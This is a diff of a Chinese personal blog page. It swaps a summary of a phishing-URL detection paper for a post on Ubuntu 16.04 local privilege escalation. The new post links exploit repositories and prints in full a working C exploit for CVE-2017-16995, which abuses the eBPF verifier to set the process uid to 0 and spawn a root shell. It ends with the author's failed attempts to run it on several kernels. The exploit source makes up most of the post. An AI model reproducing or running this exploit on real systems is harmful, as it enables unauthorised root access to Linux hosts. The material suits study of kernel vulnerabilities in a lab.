@@ -19,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>恶意url六 - 虽然没什么用但还是想记下来</title>
+  <title>ubuntu16.04本地提权漏洞 - 虽然没什么用但还是想记下来</title>
   
 
   
@@ -384,7 +384,7 @@
     
     
       <h1 class="title">
-        恶意url六
+        ubuntu16.04本地提权漏洞
       </h1>
       <div class='new-meta-box'>
         
@@ -408,7 +408,7 @@
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Mar 30, 2021</p>
+    <p>发布于：Apr 2, 2021</p>
   </a>
 </div>
 
@@ -419,7 +419,7 @@
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="恶意url六" data-path="/2021/03/30/%E6%81%B6%E6%84%8Furl%E5%85%AD/">
+      <div id="lc-pv" data-title="ubuntu16.04本地提权漏洞" data-path="/2021/04/02/ubuntu16-04%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -436,56 +436,58 @@
 
 
   
-  <h2 id="PhishStack-钓鱼URL检测中堆叠泛化的评估"><a href="#PhishStack-钓鱼URL检测中堆叠泛化的评估" class="headerlink" title="PhishStack:钓鱼URL检测中堆叠泛化的评估"></a>PhishStack:钓鱼URL检测中堆叠泛化的评估</h2><p>1、会议等级</p>
-<p>ICCIDS 2019，全称International Conference on Computational Intelligence and Data Science，作者来自孟加拉国达夫多迪国际大学公共科学与工程系。</p>
-<p>2、文章贡献</p>
-<p>A. 提出了一种多层次的方法 PhishStack，并在真实的数据集上进行评估</p>
-<p>B. PhishStack可以结合机器学习、集成学习等各种分类器，甚至基于神经网络的技术作为基础分类器。</p>
-<p>C. PhickStack使用stacked泛化器执行，准则是使得泛化器的错误率最小。</p>
-<p>3、前人工作</p>
-<p>前人达到的检测率水平：[6]—97.98%，[7]—90%，[9]—95%，[11]—95.8%，</p>
-<p>[8]提出随机森林的处理时间最短。</p>
-<p>4、数据集</p>
-<p>数据集1: <a target="_blank" rel="noopener" href="https://archive.ics.uci.edu/ml/datasets/phishing+websites">https://archive.ics.uci.edu/ml/datasets/phishing+websites</a></p>
-<p>![C8749D27-A76E-41D5-800B-BB7566002613](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/C8749D27-A76E-41D5-800B-BB7566002613.png)</p>
-<p>数据集2：<a target="_blank" rel="noopener" href="https://archive.ics.uci.edu/ml/datasets/phishing+websites">https://archive.ics.uci.edu/ml/datasets/phishing+websites</a></p>
-<p>数据集3：<a target="_blank" rel="noopener" href="https://data.mendeley.com/datasets/h3cgnj8hft/1">https://data.mendeley.com/datasets/h3cgnj8hft/1</a></p>
-<p>5、机器学习算法</p>
-<p>level1：使用的机器学习算法：RF、决策树、MLP、SVM、SGD、GND(Gaussian Naive Bayes)。之后使用了10-fold 交叉验证。</p>
-<p>level2：使用了XGBoost分类器。</p>
-<p>6、stacking的概念</p>
-<p>![E5ED40F6-D3FA-4AA3-A1D4-E0DABCDB9D61](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/E5ED40F6-D3FA-4AA3-A1D4-E0DABCDB9D61.png)</p>
-<p>为了避免训练集过拟合，使用N-fold交叉验证，他可以预测每个fold中out-of-fold的数据。</p>
-<p>在Level1:训练之后，由于用了多个算法，需要投票来决定最终的结果。并且为了得到更多特征用于level2的训练和预测，level1需要重复循环训练。即level 1的输出是下一个level的特征。</p>
-<p>7、实验结果</p>
-<p>用到的评价指标：混淆矩阵、PRC、AUC- ROC Curve、MAE、准确度。</p>
-<p>(1) Case 1: </p>
-<p>随机森林的准确度最高，达95.61%，且错误率最小。</p>
-<p>在PRC、AUC- ROC曲线方面，栈泛化只提供了很少的作用，而RF、MLP的表现更好。但是最终的预测准确度，栈泛化达到了97.44%，比其他单个分类器的效果都要好。</p>
-<p>(2) Case 2:</p>
-<p>GNB效果不好。</p>
-<p>level 1：随机森林准确度达到了96.72%，是最大的，并且错误率也最低。</p>
-<p>最终：stacked generalization准确度最高，达到了96.77%，比单个的分类器效果高一点点。</p>
-<p>stacked generalization在PRC方面效果差一点，但是在ROC曲线方面，stacked generalization、RF、MLP和SVM的AUC效果相同，都是99%。</p>
-<p>(3) Case 3:</p>
-<p>level 1: RF效果最好，97.63%。</p>
-<p>总体，stacked generalization效果最好，准确率97.86%。PRC和AUC- ROC也是stacked效果最好。</p>
+  <h2 id="关于Linux提权"><a href="#关于Linux提权" class="headerlink" title="关于Linux提权"></a>关于Linux提权</h2><p>参考知识星球中HBT的文章，总结如下：</p>
+<ul>
+<li>信息搜集</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/audit/unix-privesc-check">unix-privesc-check</a> 一个工具，自动进行信息搜集</p>
+<ul>
+<li>内核漏洞</li>
+</ul>
+<p>内核漏洞提权的通用流程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>诱使内核在内核模式下运行我们的有效负载</span><br><span class="line"><span class="number">2.</span>处理内核数据，例如进程特权</span><br><span class="line"><span class="number">3.</span>以新特权启动shell root！</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">漏洞库</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">github上脏牛漏洞的poc by dirtycow</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lucyoa/kernel-exploits">github上内核漏洞exp by lucyoa</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits">exploitdb-bin-sploits by offensive-security</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bwbwbwbw/linux-exploit-binaries">linux-exploit-binaries by bwbwbwbw</a></p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>CVE-2017-16995</p>
+<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>![1A78A8DC-78D1-4AAD-B9DD-0C4738A5ED0E](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/1A78A8DC-78D1-4AAD-B9DD-0C4738A5ED0E.png)</p>
+<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>很多文章里给的链接 <a target="_blank" rel="noopener" href="http://cyseclabs.com/exploits/upstream44.c">http://cyseclabs.com/exploits/upstream44.c</a> 打不开，从<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44298">这里</a>找到了完整的exp。如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;errno.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/bpf.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/un.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="comment">#define CRED_OFFSET 0x5f8</span></span><br><span class="line"><span class="comment">#define UID_OFFSET 4</span></span><br><span class="line"><span class="comment">#define LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="comment">#define PROGSIZE 328</span></span><br><span class="line"></span><br><span class="line">int sockets[<span class="number">2</span>];</span><br><span class="line">int mapfd, progfd;</span><br><span class="line"></span><br><span class="line">char *__prog = 	<span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">		<span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">		<span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">		<span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">		<span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">		<span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">		<span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">char bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">static int bpf_prog_load(enum bpf_prog_type prog_type,</span><br><span class="line">		  const struct bpf_insn *insns, int prog_len,</span><br><span class="line">		  const char *license, int kern_version) &#123;</span><br><span class="line">	union bpf_attr attr = &#123;</span><br><span class="line">		.prog_type = prog_type,</span><br><span class="line">		.insns = (__u64)insns,</span><br><span class="line">		.insn_cnt = prog_len / sizeof(struct bpf_insn),</span><br><span class="line">		.license = (__u64)license,</span><br><span class="line">		.log_buf = (__u64)bpf_log_buf,</span><br><span class="line">		.log_size = LOG_BUF_SIZE,</span><br><span class="line">		.log_level = <span class="number">1</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">	bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,</span><br><span class="line">		   int max_entries) &#123;</span><br><span class="line">	union bpf_attr attr = &#123;</span><br><span class="line">		.map_type = map_type,</span><br><span class="line">		.key_size = key_size,</span><br><span class="line">		.value_size = value_size,</span><br><span class="line">		.max_entries = max_entries</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_update_elem(uint64_t key, uint64_t value) &#123;</span><br><span class="line">	union bpf_attr attr = &#123;</span><br><span class="line">		.map_fd = mapfd,</span><br><span class="line">		.key = (__u64)&amp;key,</span><br><span class="line">		.value = (__u64)&amp;value,</span><br><span class="line">		.flags = <span class="number">0</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_lookup_elem(void *key, void *value) &#123;</span><br><span class="line">	union bpf_attr attr = &#123;</span><br><span class="line">		.map_fd = mapfd,</span><br><span class="line">		.key = (__u64)key,</span><br><span class="line">		.value = (__u64)value,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __exit(char *err) &#123;</span><br><span class="line">	fprintf(stderr, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line">	exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void prep(void) &#123;</span><br><span class="line">	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), <span class="number">3</span>);</span><br><span class="line">	<span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">			(struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void writemsg(void) &#123;</span><br><span class="line">	char buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">	ssize_t n = write(sockets[<span class="number">0</span>], buffer, sizeof(buffer));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n != sizeof(buffer))</span><br><span class="line">		fprintf(stderr, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define __update_elem(a, b, c) \</span></span><br><span class="line">	bpf_update_elem(<span class="number">0</span>, (a)); \</span><br><span class="line">	bpf_update_elem(<span class="number">1</span>, (b)); \</span><br><span class="line">	bpf_update_elem(<span class="number">2</span>, (c)); \</span><br><span class="line">	writemsg();</span><br><span class="line"></span><br><span class="line">static uint64_t get_value(int key) &#123;</span><br><span class="line">	uint64_t value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t __get_fp(void) &#123;</span><br><span class="line">	__update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t __read(uint64_t addr) &#123;</span><br><span class="line">	__update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __write(uint64_t addr, uint64_t val) &#123;</span><br><span class="line">	__update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t get_sp(uint64_t addr) &#123;</span><br><span class="line">	<span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void pwn(void) &#123;</span><br><span class="line">	uint64_t fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">	fp = __get_fp();</span><br><span class="line">	<span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	sp = get_sp(fp);</span><br><span class="line">	<span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">	printf(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">	credptr = __read(task_struct + CRED_OFFSET); // cred</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">	uidptr = credptr + UID_OFFSET; // uid</span><br><span class="line">	<span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">	printf(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">	__write(uidptr, <span class="number">0</span>); // set both uid <span class="keyword">and</span> gid to <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">		printf(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">		exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">	prep();</span><br><span class="line">	pwn();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>编译执行即可。但是自己尝试的时候不能执行，没有权限，应该是内核的问题。</p>
+<p>![F647CFEE-24A5-49F0-9B6E-CE6190FBE8FE](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/F647CFEE-24A5-49F0-9B6E-CE6190FBE8FE.png)</p>
+<p>当前使用的是4.15，而文章中说了影响的版本是4.4-4.14，所以更换为4.13版本。</p>
+<p>参考 <a target="_blank" rel="noopener" href="https://ixianhao.com/index.php/archives/7/">linux内核版本修改 by xianhao</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GRUB_DEFAULT=<span class="string">&quot;1 &gt;6&quot;</span> <span class="comment">#查序号的时候是从0开始的</span></span><br><span class="line">sudo update-grub</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
+
+<p>![C1241586-D760-4F58-8B77-5AAA4D5A42D6](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/C1241586-D760-4F58-8B77-5AAA4D5A42D6.png)</p>
+<p>改完之后运行，但是还是没有执行权限。</p>
+<p>![2AD87E5D-4FCD-4AE7-B3C1-0599A03D42EA](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/2AD87E5D-4FCD-4AE7-B3C1-0599A03D42EA.png)</p>
+<p>猜测可能还是内核版本的问题，将内核更换为4.4版本。<a target="_blank" rel="noopener" href="https://kernel.ubuntu.com/~kernel-ppa/mainline/">官网下载</a> ，然后进行如下操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --install *.deb</span><br><span class="line">GRUB_DEFAULT=<span class="string">&quot;1 &gt;9&quot;</span> <span class="comment">#4.40位置在第10个</span></span><br><span class="line">sudo update-grub</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
+
+<p>![8BC1FACF-8561-4A93-998A-85DEA010DF53](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/8BC1FACF-8561-4A93-998A-85DEA010DF53.png)</p>
+<p>还是没有成功，但是起码输出有一些提示了….</p>
+<p>![6AB8AD11-EBB2-451A-B5BD-C9449DD89C69](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/6AB8AD11-EBB2-451A-B5BD-C9449DD89C69.png)</p>
